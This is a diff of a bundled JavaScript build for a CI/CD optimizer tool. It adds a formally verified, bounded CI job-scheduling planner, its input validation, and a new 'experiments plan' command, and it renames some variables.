+      recall: number(corpus.recall, "corpus.recall", 1),
+      f1: number(corpus.f1, "corpus.f1", 1),
+      fixRate: number(corpus.fixRate, "corpus.fixRate", 1),
+      durationMs: number(corpus.durationMs, "corpus.durationMs")
+    };
+  }
+  if (record5.ci !== void 0) {
+    const ci = object(record5.ci, "ci");
+    if (Object.keys(ci).length > 128) throw new Error("At most 128 CI metric series.");
+    result.ci = Object.fromEntries(Object.entries(ci).map(([id, samples]) => {
+      if (!Array.isArray(samples) || samples.length > 1e4) throw new Error(`ci.${id} must have at most 10000 samples.`);
+      return [id, samples.map((sample) => number(sample, `ci.${id}`))];
+    }));
+  }
+  if (record5.ciEvidence !== void 0) result.ciEvidence = decodeCiEvidence(record5.ciEvidence);
+  return result;
+}
+function parseMeasurements(text7) {
+  const record5 = object(parseStrictJson(text7, true), "measurements");
+  exactKeys(record5, ["experiment", "collectedAt", "needsCorpus", "control", "arms"], "measurements");
+  if (!Array.isArray(record5.arms) || record5.arms.length > 256) throw new Error("measurements.arms must have at most 256 records.");
+  const result = {
+    experiment: string(record5.experiment, "experiment"),
+    collectedAt: string(record5.collectedAt, "collectedAt"),
+    control: branch(record5.control),
+    arms: record5.arms.map(branch)
+  };
+  if (!Number.isFinite(Date.parse(result.collectedAt))) throw new Error("Invalid collection timestamp.");
+  if (record5.needsCorpus !== void 0) result.needsCorpus = boolean(record5.needsCorpus, "needsCorpus");
+  return result;
+}
+
 // src/experiments/propose.ts
 var import_yaml44 = __toESM(require_dist(), 1);
+
+// src/formal/generated/manifest.ts
+var PROOF_BUILD = {
+  "schema": "cicd-optimizer/formal-v1",
+  "dafny": "4.11.0",
+  "z3": "4.12.1",
+  "arithmetic": "unbounded-integers; scalar-Unicode; objective-10000; ties-to-positive-infinity",
+  "modelSha256": "c02c0d35c01265610c159d692a034ab811f4df1700b5878572f8afe182fd9262",
+  "translatorOutputSha256": "5ecf8ba65e344f559afd725db29c7758cc3c6ac915db5226dd57b22619868492",
+  "generatedSha256": "4671d663638a25d876371283bc8f947c63218c0d8846fa348fe8db3cfa2c3aa7",
+  "toolchainSha256": "c84fc3e1aff1ada6170869b55db95e6bff37fa23f2273e6a9549ebfb1ef59578",
+  "implementationSha256": "62cd5dd6702bbdbb3224ad3604197a41486f81fe93ce65d6f16bd70c667ec4d8",
+  "generatorSha256": "3796e86ad20c33e0b41cc5ad4490c09338a37e5c6d2ea7c2b2f9095dbf298aed",
+  "dependenciesSha256": "29541c79a3a66abe02d08f761eb5f09a36ff175b2fe6081af12c2ee7600517cc"
+};
+
+// src/experiments/plan.ts
+var CI_ENVIRONMENT_SCHEMA = "cicd-optimizer/ci-environment-v1";
+var CI_PLAN_SCHEMA = "cicd-optimizer/ci-plan-v1";
+var CI_MODEL_MAX_BYTES = 64e3;
+function safeNumber(value2, label) {
+  if (!BigNumber.isBigNumber(value2) || !value2.isInteger()) throw new Error(`Invalid generated ${label}.`);
+  const number3 = value2.toNumber();
+  if (!Number.isSafeInteger(number3) || Object.is(number3, -0) || number3 < 0 || !value2.eq(number3)) throw new Error(`Generated ${label} exceeds the safe integer range.`);
+  return number3;
+}
+var CI_MODEL_LIMITS = Object.freeze({
+  maxJobs: safeNumber(CiPolicy.__default.MaxJobs, "job bound"),
+  maxModes: safeNumber(CiPolicy.__default.MaxModes, "mode bound"),
+  maxHorizonTicks: safeNumber(CiPolicy.__default.MaxHorizon, "horizon bound"),
+  maxDurationTicks: safeNumber(CiPolicy.__default.MaxDuration, "duration bound"),
+  maxRunnerUnits: safeNumber(CiPolicy.__default.MaxCapacity, "capacity bound"),
+  maxModeCostUnits: safeNumber(CiPolicy.__default.MaxModeCost, "cost bound"),
+  maxSearchBudget: safeNumber(CiPolicy.__default.MaxSearchBudget, "search bound"),
+  defaultSearchBudget: safeNumber(CiPolicy.__default.DefaultSearchBudget, "default search budget"),
+  maxTimeUnitSeconds: 86400
+});
+var CI_MODEL_ASSUMPTIONS = Object.freeze([
+  "The jobs, dependencies and interchangeable execution modes describe the intended workload by declaration. No workflow-to-model mapping or arbitrary-code semantic equivalence is verified.",
+  "Each selected mode has the declared deterministic positive integer duration, fixed nonnegative execution cost and positive pooled runner demand. Setup, cache effects and other relevant work must already be included in those declarations; telemetry is not authenticated here.",
+  "All jobs execute once, nonpreemptively, at integer ticks within the declared horizon. All are initially available except for listed finish-to-start dependencies. The constant fungible runner pool is dedicated to this model, with no external queueing or unmodeled contention.",
+  "Cost is the sum of selected mode costs. Resource use occupies half-open [start,finish) intervals. The objective is lexicographic makespan, then cost, then input-order mixed-radix policy identifier.",
+  "Optimality and infeasibility concern every admissible schedule in this bounded model, not omitted modes, fractional starts, other horizons, dynamic jobs, heterogeneous runner affinities, retries, or arbitrary real CI behavior. Search-budget exhaustion proves neither optimality nor infeasibility.",
+  "Git source binding identifies the committed model input only. It does not prove correspondence to a workflow, correctness of duration profiles, evidence authenticity, future speedup, or statistical significance.",
+  "An optimal plan is a candidate for validation, not permission to promote. Existing measured-evidence and correctness gates remain mandatory for experimental promotion."
+]);
+function identifier(value2, label) {
+  const id = string(value2, label);
+  if (!/^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/.test(id)) throw new Error(`${label} must be a nonempty ASCII model identifier of at most 64 characters.`);
+  return id;
+}
+function array(value2, label, maximum) {
+  if (!Array.isArray(value2) || value2.length > maximum) throw new Error(`${label} must be an array of at most ${maximum} entries.`);
+  return value2;
+}
+function parseCiEnvironmentModel(text7) {
+  if (Buffer.byteLength(text7, "utf8") > CI_MODEL_MAX_BYTES) throw new Error(`CI environment exceeds the ${CI_MODEL_MAX_BYTES} byte input limit.`);
+  const model = object(parseStrictJson(text7), "CI environment");
+  exactKeys(model, ["schema", "timeUnitSeconds", "horizonTicks", "runnerCapacity", "maxCostUnits", "jobs"], "CI environment");
+  if (model.schema !== CI_ENVIRONMENT_SCHEMA) throw new Error(`Expected schema ${CI_ENVIRONMENT_SCHEMA}.`);
+  const seenJobs = /* @__PURE__ */ new Set();
+  const jobs = array(model.jobs, "jobs", CI_MODEL_LIMITS.maxJobs).map((value2, jobIndex) => {
+    const label = `jobs[${jobIndex}]`;
+    const job = object(value2, label);
+    exactKeys(job, ["id", "needs", "modes"], label);
+    const id = identifier(job.id, `${label}.id`);
+    if (seenJobs.has(id)) throw new Error(`Duplicate job identifier: ${id}.`);
+    const needs = array(job.needs, `${label}.needs`, CI_MODEL_LIMITS.maxJobs).map((entry2) => identifier(entry2, `${label}.needs`));
+    if (new Set(needs).size !== needs.length) throw new Error(`Duplicate dependency in ${label}.needs.`);
+    for (const dependency of needs) {
+      if (!seenJobs.has(dependency)) throw new Error(`${label}.needs: ${dependency} must name an earlier job. Explicit topological order is required; cycles, self-dependencies and unknown jobs are invalid.`);
+    }
+    const seenModes = /* @__PURE__ */ new Set();
+    const modes = array(job.modes, `${label}.modes`, CI_MODEL_LIMITS.maxModes).map((entry2, modeIndex) => {
+      const location3 = `${label}.modes[${modeIndex}]`;
+      const mode = object(entry2, location3);
+      exactKeys(mode, ["id", "durationTicks", "costUnits", "runnerDemand"], location3);
+      const modeId = identifier(mode.id, `${location3}.id`);
+      if (seenModes.has(modeId)) throw new Error(`Duplicate mode identifier in ${label}: ${modeId}.`);
+      seenModes.add(modeId);
+      return {
+        id: modeId,
+        durationTicks: integer(mode.durationTicks, `${location3}.durationTicks`, 1, CI_MODEL_LIMITS.maxDurationTicks),
+        costUnits: integer(mode.costUnits, `${location3}.costUnits`, 0, CI_MODEL_LIMITS.maxModeCostUnits),
+        runnerDemand: integer(mode.runnerDemand, `${location3}.runnerDemand`, 1, CI_MODEL_LIMITS.maxRunnerUnits)
+      };
+    });
+    if (!modes.length) throw new Error(`${label}.modes must contain at least one mode.`);
+    seenJobs.add(id);
+    return { id, needs, modes };
+  });
+  return {
+    schema: CI_ENVIRONMENT_SCHEMA,
+    timeUnitSeconds: integer(model.timeUnitSeconds, "timeUnitSeconds", 1, CI_MODEL_LIMITS.maxTimeUnitSeconds),
+    horizonTicks: integer(model.horizonTicks, "horizonTicks", 1, CI_MODEL_LIMITS.maxHorizonTicks),
+    runnerCapacity: integer(model.runnerCapacity, "runnerCapacity", 1, CI_MODEL_LIMITS.maxRunnerUnits),
+    maxCostUnits: integer(model.maxCostUnits, "maxCostUnits", 0, CI_MODEL_LIMITS.maxJobs * CI_MODEL_LIMITS.maxModeCostUnits),
+    jobs
+  };
+}
+function planCiEnvironment(input2, options = {}) {
+  const model = parseCiEnvironmentModel(canonicalJson(input2));
+  const request = object(parseStrictJson(canonicalJson(options)), "planning options");
+  exactKeys(request, ["searchBudget"], "planning options");
+  const budget = request.searchBudget === void 0 ? CI_MODEL_LIMITS.defaultSearchBudget : integer(request.searchBudget, "searchBudget", 1, CI_MODEL_LIMITS.maxSearchBudget);
+  const jobs = _dafny.Seq.of(...model.jobs.map((job) => CiPolicy.Job.create_Job(
+    _dafny.Seq.of(...job.modes.map((mode) => CiPolicy.Mode.create_Mode(
+      new BigNumber(mode.durationTicks),
+      new BigNumber(mode.costUnits),
+      new BigNumber(mode.runnerDemand)
+    ))),
+    _dafny.Seq.of(...job.needs.map((id) => new BigNumber(model.jobs.findIndex((entry2) => entry2.id === id))))
+  )));
+  const environment2 = CiPolicy.Environment.create_Environment(
+    jobs,
+    new BigNumber(model.horizonTicks),
+    new BigNumber(model.runnerCapacity),
+    new BigNumber(model.maxCostUnits)
+  );
+  const result = CiPolicy.__default.Optimize(environment2, new BigNumber(budget));
+  if (result.is_Invalid) throw new Error("The generated optimizer rejected this environment or budget.");
+  if (!result.is_Exhausted && !result.is_Infeasible && !result.is_Optimal) throw new Error("Unexpected generated optimizer result.");
+  const requiredPolicies = safeNumber(result.is_Exhausted ? result.dtor_required : result.dtor_examined, "policy count");
+  const base2 = {
+    schema: CI_PLAN_SCHEMA,
+    modelSha256: sha256(`${CI_ENVIRONMENT_SCHEMA}\0${canonicalJson(model)}`),
+    proof: PROOF_BUILD,
+    assumptions: CI_MODEL_ASSUMPTIONS,
+    timeUnitSeconds: model.timeUnitSeconds,
+    search: { budget, requiredPolicies, examinedPolicies: result.is_Exhausted ? 0 : requiredPolicies, complete: !result.is_Exhausted }
+  };
+  if (result.is_Exhausted) return { ...base2, status: "budget-exhausted" };
+  if (result.is_Infeasible) return { ...base2, status: "infeasible" };
+  if (result.dtor_policy.length !== model.jobs.length) throw new Error("Generated policy has the wrong number of jobs.");
+  const schedule = model.jobs.map((job, index) => {
+    const placement = result.dtor_policy[index];
+    const modeIndex = safeNumber(placement.dtor_mode, "mode index");
+    const mode = job.modes[modeIndex];
+    if (!mode) throw new Error("Generated mode is outside the declared model.");
+    return {
+      job: job.id,
+      mode: mode.id,
+      startTick: safeNumber(placement.dtor_start, "start tick"),
+      finishTick: safeNumber(CiPolicy.__default.Finish(jobs, result.dtor_policy, new BigNumber(index)), "finish tick"),
+      runnerDemand: mode.runnerDemand,
+      costUnits: mode.costUnits
+    };
+  });
+  return {
+    ...base2,
+    status: "optimal",
+    policyId: safeNumber(result.dtor_rank, "policy identifier"),
+    objective: {
+      makespanTicks: safeNumber(result.dtor_objective.dtor_makespan, "makespan"),
+      costUnits: safeNumber(result.dtor_objective.dtor_cost, "cost")
+    },
+    schedule,
+    runnerUsageByTick: Array.from({ length: model.horizonTicks }, (_, tick) => safeNumber(
+      CiPolicy.__default.Load(jobs, result.dtor_policy, new BigNumber(tick), new BigNumber(model.jobs.length)),
+      "runner load"
+    )),
+    nextStep: "validate-as-experiment"
+  };
+}
+
+// src/experiments/propose.ts
 var DAY2 = 864e5;
-function validateProposal(text6, options) {
+function validateProposal(text7, options) {
   const now2 = options.now ?? /* @__PURE__ */ new Date();
   const createdAt = now2.toISOString();
   const expiresAt = new Date(now2.getTime() + options.config.selection.maxAgeDays * DAY2).toISOString();
   let raw;
   try {
-    raw = (0, import_yaml44.parse)(text6);
+    raw = (0, import_yaml44.parse)(text7);
   } catch (error2) {
     return { errors: [`manifest: ${error2.message}`] };
   }
@@ -35019,6 +42247,8 @@ function outcome(pull) {
   return pull.state === "open" ? "running" : "closed";
 }
 function generatorContext(input2) {
+  if (input2.ciSearchBudget !== void 0 && !input2.ciModel) throw new Error("A CI environment model is required for a planning search budget.");
+  const ciPlan = input2.ciModel ? planCiEnvironment(input2.ciModel, input2.ciSearchBudget === void 0 ? {} : { searchBudget: input2.ciSearchBudget }) : void 0;
   const byRule = /* @__PURE__ */ new Map();
   for (const diagnostic of input2.diagnostics ?? []) byRule.set(diagnostic.ruleId, (byRule.get(diagnostic.ruleId) ?? 0) + 1);
   const findings4 = [...byRule.entries()].sort((a, b) => b[1] - a[1] || a[0].localeCompare(b[0]));
@@ -35042,6 +42272,19 @@ function generatorContext(input2) {
     `Arms must beat the trunk control by at least ${(input2.config.selection.minImprovement * 100).toFixed(1)}% (weighted) and must not modify: ${input2.config.protectedPaths.map((path) => `\`${path}\``).join(", ")}.`,
     `At most ${input2.config.selection.maxArms} arms per experiment and ${input2.config.selection.maxConcurrent} concurrent experiments.`,
     "",
+    "## Conditional CI policy planning",
+    "",
+    ...ciPlan ? [
+      "This plan was recomputed by the verified bounded CI environment optimizer. Use an optimal plan only as a candidate for an experiment, never as measured evidence or permission to promote. Validate the declared workflow correspondence and timing/resource assumptions independently. Budget exhaustion is not infeasibility.",
+      "",
+      "```json",
+      JSON.stringify(ciPlan, null, 2),
+      "```",
+      ""
+    ] : [
+      "No CI environment model was supplied. Observed candidate scores and telemetry do not prove scheduling optimality. Use `experiments plan --model <ci-environment.json>` or supply `context --model` for an explicit bounded model; do not invent duration profiles or label heuristic proposals optimal.",
+      ""
+    ],
     "## Current findings",
     "",
     ...findings4.length > 0 ? ["| Rule | Findings |", "| --- | --- |", ...findings4.slice(0, 30).map(([rule, count]) => `| \`${rule}\` | ${count} |`)] : ["No findings were supplied."],
@@ -35082,13 +42325,13 @@ import { join as join4, relative as relative3, sep as sep2 } from "node:path";
 import { promisify } from "node:util";
 var run = promisify(execFile);
 var LOCKFILE_HEAD_BYTES = 8192;
-function selectInventory(entries2, config) {
+function selectInventory(entries3, config) {
   const paths = [];
   const truncated = [];
   let complete = true;
   let excluded = false;
   const ignored2 = (path) => config.ignorePaths.some((glob) => matchesGlob(path, glob) || matchesGlob(path, `${glob}/**`));
-  for (const entry2 of [...entries2].sort((a, b) => a.path.localeCompare(b.path))) {
+  for (const entry2 of [...entries3].sort((a, b) => a.path.localeCompare(b.path))) {
     if (ignored2(entry2.path)) {
       if (isInventoryPath(entry2.path) || entry2.opaque && !entry2.path.split("/").some((part2) => SKIP_DIRS.has(part2))) excluded = true;
       continue;
@@ -35130,9 +42373,9 @@ async function walk2(root, dir, out) {
   }
 }
 async function loadDirectory(root, config, change) {
-  const entries2 = [];
-  await walk2(root, root, entries2);
-  const selection = selectInventory(entries2, config);
+  const entries3 = [];
+  await walk2(root, root, entries3);
+  const selection = selectInventory(entries3, config);
   const truncated = new Set(selection.truncated);
   const files = await Promise.all(
     selection.paths.map(async (path) => {
@@ -35148,8 +42391,8 @@ async function git(root, args) {
 }
 async function loadGitRevision(root, ref, config) {
   const listing = await git(root, ["ls-tree", "-r", "-l", "-z", "--full-tree", ref]);
-  const entries2 = listing.split("\0").map((line) => /^(\d+) (?:blob|commit) [0-9a-f]+\s+(\d+|-)\t([\s\S]+)$/.exec(line)).filter((match2) => match2 !== null).map((match2) => ({ path: match2[3], size: Number(match2[2]) || 0, opaque: match2[1] === "120000" || match2[1] === "160000" }));
-  const selection = selectInventory(entries2, config);
+  const entries3 = listing.split("\0").map((line) => /^(\d+) (?:blob|commit) [0-9a-f]+\s+(\d+|-)\t([\s\S]+)$/.exec(line)).filter((match2) => match2 !== null).map((match2) => ({ path: match2[3], size: Number(match2[2]) || 0, opaque: match2[1] === "120000" || match2[1] === "160000" }));
+  const selection = selectInventory(entries3, config);
   const truncated = new Set(selection.truncated);
   const files = [];
   for (const path of selection.paths) {
@@ -35353,7 +42596,7 @@ function explainRuleText(id, rules15, severities) {
   const rule = rules15.find((candidate) => candidate.meta.id === id);
   if (!rule) return void 0;
   const { meta } = rule;
-  const indent = (text6) => text6.replace(/\n$/, "").split("\n").map((line) => `    ${line}`).join("\n");
+  const indent = (text7) => text7.replace(/\n$/, "").split("\n").map((line) => `    ${line}`).join("\n");
   const lines = [
     meta.id,
     "",
@@ -35363,6 +42606,7 @@ function explainRuleText(id, rules15, severities) {
     `  Presets:   ${meta.presets.length > 0 ? meta.presets.join(", ") : "(none)"}`,
     `  Fixable:   ${meta.fixable ? "yes" : "no"}`,
     `  Impact:    ${meta.impact}`,
+    `  Assurance: ${allRules.some((candidate) => candidate.meta.id === id) ? assuranceText(id) : "Local rule: not covered by the built-in assurance catalogue."}`,
     ...meta.requires.length > 0 ? [`  Requires:  ${meta.requires.join(", ")}`] : [],
     "",
     meta.description
@@ -35447,10 +42691,10 @@ function validateRule(entry2, value2) {
     check: (context4) => check.call(value2, context4)
   };
 }
-async function loadLocalRules(root, entries2, builtins) {
+async function loadLocalRules(root, entries3, builtins) {
   const loaded = [];
   const builtinIds = new Set(builtins.map((rule) => rule.meta.id));
-  for (const entry2 of entries2) {
+  for (const entry2 of entries3) {
     const real = await resolveModule(root, entry2);
     let module;
     try {
@@ -35605,7 +42849,11 @@ function extractUnusedFlag(args) {
 }
 function ruleListText(rules15) {
   const width = Math.max(...rules15.map((rule) => rule.meta.id.length));
-  return rules15.map((rule) => `${rule.meta.id.padEnd(width)}  ${rule.meta.defaultSeverity.padEnd(5)}  ${rule.meta.fixable ? "fix" : "   "}  ${rule.meta.description}`).join("\n");
+  return rules15.map((rule) => {
+    const builtin = allRules.some((candidate) => candidate.meta.id === rule.meta.id);
+    if (builtin) ruleAssurance(rule.meta.id);
+    return `${rule.meta.id.padEnd(width)}  ${rule.meta.defaultSeverity.padEnd(5)}  ${rule.meta.fixable ? "fix" : "   "}  ${rule.meta.description}  [${builtin ? "heuristic" : "local/unreviewed"}]`;
+  }).join("\n");
 }
 function invalidConfig(path, problems) {
   return new UsageError(`Invalid configuration ${path}:
@@ -35614,12 +42862,12 @@ ${problems.map((problem) => `  ${problem.path || "(root)"}: ${problem.message}`)
 async function loadLintConfig(io, root, explicit, options = {}) {
   const candidates2 = explicit ? [resolvePath(io, explicit)] : CONFIG_PATHS.map((path) => join6(root, path));
   for (const path of candidates2) {
-    const text6 = await readFile3(path, "utf8").catch((error2) => {
+    const text7 = await readFile3(path, "utf8").catch((error2) => {
       if (error2.code === "ENOENT" && !explicit) return void 0;
       throw new UsageError(`Cannot read configuration ${path}: ${error2.message}`);
     });
-    if (text6 === void 0) continue;
-    const parsed = parseConfigText(text6, allRules, path);
+    if (text7 === void 0) continue;
+    const parsed = parseConfigText(text7, allRules, path);
     if (parsed.problems.length > 0) throw invalidConfig(path, parsed.problems);
     if (parsed.migrated) io.stderr(`${path}: legacy configuration keys were migrated; run with --format json to inspect the effective rules.`);
     if (!options.localRules || parsed.config.localRules.length === 0) return { config: parsed.config, path, rules: allRules };
@@ -35627,7 +42875,7 @@ async function loadLintConfig(io, root, explicit, options = {}) {
       throw new UsageError(`${path} lists localRules, which run JavaScript from the repository. Pass --allow-local-rules to load them (trusted repositories only).`);
     }
     const rules15 = [...allRules, ...await loadLocalRules(root, parsed.config.localRules, allRules)];
-    const strict = parseConfigText(text6, rules15, path);
+    const strict = parseConfigText(text7, rules15, path);
     if (strict.problems.length > 0) throw invalidConfig(path, strict.problems);
     return { config: strict.config, path, rules: rules15 };
   }
@@ -35667,9 +42915,9 @@ async function missReason(root, selector, config, inventoryComplete) {
   return inventoryComplete ? "not analyzed (inside a directory the inventory skips, such as node_modules or .git)" : "not analyzed: the inventory hit limits.maxFiles or limits.maxFileBytes";
 }
 function explainRule(id, rules15, severities) {
-  const text6 = explainRuleText(id, rules15, severities);
-  if (text6 === void 0) throw new UsageError(unknownRuleMessage("--explain", id, rules15));
-  return text6;
+  const text7 = explainRuleText(id, rules15, severities);
+  if (text7 === void 0) throw new UsageError(unknownRuleMessage("--explain", id, rules15));
+  return text7;
 }
 async function initConfig(io, root, explicit) {
   const target = explicit ? resolvePath(io, explicit) : join6(root, ".github/ci-cd-optimizer.yml");
@@ -35888,12 +43136,55 @@ async function lintCommand(rawArgs, io) {
   return 0;
 }
 
+// src/cli/ci-plan.ts
+import { open } from "node:fs/promises";
+import { parseArgs as parseArgs2 } from "node:util";
+function searchBudgetOption(value2) {
+  if (value2 === void 0) return CI_MODEL_LIMITS.defaultSearchBudget;
+  if (typeof value2 !== "string" || !/^[1-9]\d*$/.test(value2) || !Number.isSafeInteger(Number(value2)) || Number(value2) > CI_MODEL_LIMITS.maxSearchBudget) {
+    throw new UsageError(`--search-budget must be an integer in [1, ${CI_MODEL_LIMITS.maxSearchBudget}].`);
+  }
+  return Number(value2);
+}
+async function readCiEnvironment(io, path) {
+  const file = await open(resolvePath(io, path), "r");
+  try {
+    if (!(await file.stat()).isFile()) throw new Error("The CI environment must be a regular file.");
+    const bytes = Buffer.alloc(CI_MODEL_MAX_BYTES + 1);
+    let length = 0;
+    while (length < bytes.length) {
+      const { bytesRead } = await file.read(bytes, length, bytes.length - length, null);
+      if (!bytesRead) break;
+      length += bytesRead;
+    }
+    if (length > CI_MODEL_MAX_BYTES) throw new Error(`CI environment exceeds the ${CI_MODEL_MAX_BYTES} byte input limit.`);
+    return parseCiEnvironmentModel(new TextDecoder("utf-8", { fatal: true, ignoreBOM: true }).decode(bytes.subarray(0, length)));
+  } finally {
+    await file.close();
+  }
+}
+async function ciPlanCommand(args, io) {
+  const { values: values2 } = parseArgs2({
+    args,
+    strict: true,
+    options: { model: { type: "string" }, "search-budget": { type: "string" }, output: { type: "string" } }
+  });
+  if (!values2.model) throw new UsageError("experiments plan requires --model <ci-environment.json>.");
+  const budget = searchBudgetOption(values2["search-budget"]);
+  const model = await readCiEnvironment(io, values2.model);
+  const plan = planCiEnvironment(model, { searchBudget: budget });
+  await writeText(io, values2.output, canonicalJson(plan));
+  io.stderr(plan.status === "optimal" ? "Optimal within the declared CI model only. Validate this candidate empirically before any promotion; workflow correspondence and timing profiles are assumptions." : plan.status === "infeasible" ? "No feasible policy exists within the declared model and horizon; the complete policy space was checked." : `Search budget exhausted before enumeration: ${plan.search.requiredPolicies} policies require more than the ${budget} policy budget. No optimum or infeasibility claim.`);
+  return plan.status === "optimal" ? 0 : plan.status === "infeasible" ? 4 : 5;
+}
+
 // src/cli/experiments.ts
 var EXPERIMENTS_HELP = `Usage: ci-cd-optimizer experiments <command> [options]
 
 Hill-climbing experiments on experiments/<name>/<arm> branches (see docs/experiments.md).
 
 Commands:
+  plan                      Exactly optimize a declared bounded CI environment (no publication)
   list                      Running experiments as JSON
   capacity                  Open experiment count and configured concurrency budget as JSON
   context                   Markdown briefing for the experiment generator agent
@@ -35912,7 +43203,9 @@ resume:    --experiment <name> --expected-head <SHA> [--base <branch>] [--dry-ru
 collect:   [--experiment <name>] --output-dir <dir> | --output <file>
 evaluate:  --measurements <file|dir> [--repo-dir <dir>]  |  --engine <module> [--corpus <dir>]
 decide:    --measurements <file|dir> [--agent-output <file>] [--apply]
-context:   [--dir <dir>] [--telemetry <file>] [--output <file>]
+context:   [--dir <dir>] [--telemetry <file>] [--model <ci-environment.json>] [--search-budget <policies>] [--output <file>]
+plan:      --model <ci-environment.json> [--search-budget <policies>] [--output <file>]
+           Exit 0: model optimum; 4: proved model infeasible; 5: budget exhausted (no partial result).
 `;
 var COMMON = {
   repo: { type: "string" },
@@ -35932,19 +43225,19 @@ async function readText(io, path) {
 }
 async function loadHillClimbConfig(io, explicit) {
   const path = resolvePath(io, explicit ?? HILL_CLIMB_CONFIG_PATH);
-  const text6 = await readFile4(path, "utf8").catch((error2) => {
+  const text7 = await readFile4(path, "utf8").catch((error2) => {
     if (error2.code === "ENOENT" && !explicit) return void 0;
     throw new UsageError(`Cannot read ${path}: ${error2.message}`);
   });
-  const parsed = parseHillClimbConfig(text6);
+  const parsed = parseHillClimbConfig(text7);
   if (parsed.problems.length > 0) throw new UsageError(`Invalid ${path}:
 ${parsed.problems.map((p2) => `  ${p2.path || "(root)"}: ${p2.message}`).join("\n")}`);
   return parsed.config;
 }
 async function loadManifest(client, repo, name, config, ref = trunkBranch(name)) {
-  const text6 = await readFileAt(client, repo, manifestPath(name), ref);
-  if (text6 === void 0) throw new Error(`${manifestPath(name)} was not found at ${ref}`);
-  const parsed = parseManifest2(text6, { config });
+  const text7 = await readFileAt(client, repo, manifestPath(name), ref);
+  if (text7 === void 0) throw new Error(`${manifestPath(name)} was not found at ${ref}`);
+  const parsed = parseManifest2(text7, { config });
   if (!parsed.manifest) throw new Error(`${manifestPath(name)} is invalid: ${parsed.problems.map((p2) => `${p2.path}: ${p2.message}`).join("; ")}`);
   return parsed.manifest;
 }
@@ -36007,10 +43300,10 @@ async function caseFiles(io, raw, config) {
     const caseText = typeof item.case === "string" ? item.case : JSON.stringify(item.case ?? {});
     const contents = item.files ?? {};
     if (typeof contents !== "object" || Array.isArray(contents)) throw new Error(`cases[${index}].files must map paths to contents`);
-    const entries2 = Object.entries(contents);
-    if (entries2.length === 0 || entries2.length > MAX_CASE_FILES) throw new Error(`cases[${index}].files must contain 1-${MAX_CASE_FILES} files`);
+    const entries3 = Object.entries(contents);
+    if (entries3.length === 0 || entries3.length > MAX_CASE_FILES) throw new Error(`cases[${index}].files must contain 1-${MAX_CASE_FILES} files`);
     const sources = [];
-    for (const [path, content2] of entries2) {
+    for (const [path, content2] of entries3) {
       if (typeof content2 !== "string") throw new Error(`cases[${index}].files["${path}"] must be text`);
       if (path.startsWith("/") || path.split("/").some((segment) => segment === ".." || segment === "") || path.includes("\\")) {
         throw new Error(`cases[${index}].files: invalid path "${path}"`);
@@ -36026,7 +43319,7 @@ async function caseFiles(io, raw, config) {
   return files;
 }
 async function listCommand(args, io) {
-  const { values: values2 } = parseArgs2({ args, strict: true, options: { ...COMMON } });
+  const { values: values2 } = parseArgs3({ args, strict: true, options: { ...COMMON } });
   const config = await loadHillClimbConfig(io, values2.config);
   const repo = repoFrom(values2.repo, io);
   const running = await runningExperiments(githubClient(io), repo, config);
@@ -36041,7 +43334,7 @@ async function listCommand(args, io) {
   return 0;
 }
 async function capacityCommand(args, io) {
-  const { values: values2 } = parseArgs2({ args, strict: true, options: { ...COMMON } });
+  const { values: values2 } = parseArgs3({ args, strict: true, options: { ...COMMON } });
   const config = await loadHillClimbConfig(io, values2.config);
   const states3 = groupExperiments(await listExperimentPullRequests(githubClient(io), repoFrom(values2.repo, io)));
   const running = states3.filter((state) => state.trunk?.state === "open").length;
@@ -36050,7 +43343,10 @@ async function capacityCommand(args, io) {
   return 0;
 }
 async function contextCommand(args, io) {
-  const { values: values2 } = parseArgs2({ args, strict: true, options: { ...COMMON, dir: { type: "string" }, telemetry: { type: "string" }, output: { type: "string", short: "o" } } });
+  const { values: values2 } = parseArgs3({ args, strict: true, options: { ...COMMON, dir: { type: "string" }, telemetry: { type: "string" }, model: { type: "string" }, "search-budget": { type: "string" }, output: { type: "string", short: "o" } } });
+  if (values2["search-budget"] !== void 0 && !values2.model) throw new UsageError("context --search-budget requires --model.");
+  const ciModel = values2.model ? await readCiEnvironment(io, values2.model) : void 0;
+  const ciSearchBudget = searchBudgetOption(values2["search-budget"]);
   const config = await loadHillClimbConfig(io, values2.config);
   const repo = repoFrom(values2.repo, io);
   const client = githubClient(io);
@@ -36061,19 +43357,20 @@ async function contextCommand(args, io) {
   const history = await listExperimentPullRequests(client, repo, "all");
   const running = groupExperiments(history.filter((pull) => pull.state === "open"));
   const telemetry = values2.telemetry ? await readText(io, values2.telemetry) : void 0;
-  const text6 = generatorContext({
+  const text7 = generatorContext({
     config,
     diagnostics,
     ...telemetry ? { telemetry } : {},
+    ...ciModel ? { ciModel, ciSearchBudget } : {},
     running,
     history,
     rules: allRules.map((rule) => ({ id: rule.meta.id, description: rule.meta.description }))
   });
-  await writeText(io, values2.output, text6);
+  await writeText(io, values2.output, text7);
   return 0;
 }
 async function createCommand(args, io) {
-  const { values: values2 } = parseArgs2({
+  const { values: values2 } = parseArgs3({
     args,
     strict: true,
     options: {
@@ -36139,7 +43436,7 @@ ${result.errors.map((error2) => `  - ${error2}`).join("\n")}`);
   return failed ? 1 : 0;
 }
 async function resumeCommand(args, io) {
-  const { values: values2 } = parseArgs2({
+  const { values: values2 } = parseArgs3({
     args,
     strict: true,
     options: { ...COMMON, experiment: { type: "string" }, "expected-head": { type: "string" }, base: { type: "string" }, "dry-run": { type: "boolean", default: false } }
@@ -36160,7 +43457,7 @@ async function resumeCommand(args, io) {
   return 0;
 }
 async function collectCommand(args, io) {
-  const { values: values2 } = parseArgs2({ args, strict: true, options: { ...COMMON, experiment: { type: "string" }, output: { type: "string", short: "o" }, "output-dir": { type: "string" } } });
+  const { values: values2 } = parseArgs3({ args, strict: true, options: { ...COMMON, experiment: { type: "string" }, output: { type: "string", short: "o" }, "output-dir": { type: "string" } } });
   if (!values2.output === !values2["output-dir"]) throw new UsageError("collect needs exactly one of --output or --output-dir.");
   if (values2.output && !values2.experiment) throw new UsageError("--output needs --experiment; use --output-dir for every running experiment.");
   const config = await loadHillClimbConfig(io, values2.config);
@@ -36184,7 +43481,7 @@ async function collectCommand(args, io) {
   return 0;
 }
 async function evaluateCommand(args, io) {
-  const { values: values2 } = parseArgs2({
+  const { values: values2 } = parseArgs3({
     args,
     strict: true,
     options: { ...COMMON, measurements: { type: "string" }, "repo-dir": { type: "string" }, engine: { type: "string" }, corpus: { type: "string" }, output: { type: "string", short: "o" } }
@@ -36200,7 +43497,7 @@ async function evaluateCommand(args, io) {
